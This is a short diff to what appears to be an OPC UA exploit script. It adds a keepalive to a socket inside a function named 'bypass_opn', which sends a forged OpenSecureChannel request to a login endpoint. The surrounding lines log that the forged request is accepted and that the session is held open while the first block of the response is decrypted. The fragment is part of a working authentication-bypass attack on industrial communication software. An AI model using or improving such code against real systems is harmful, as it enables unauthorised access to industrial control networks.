@@ -1303,6 +1303,7 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
   
   log('Performing the OPN handshake...')
   login_sock = connect_and_hello(login_endpoint.endpointUrl)
+  keepalive.set(login_sock)
   opn_reply = opc_exchange(login_sock, opn_req)
   
   log_success('Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.')
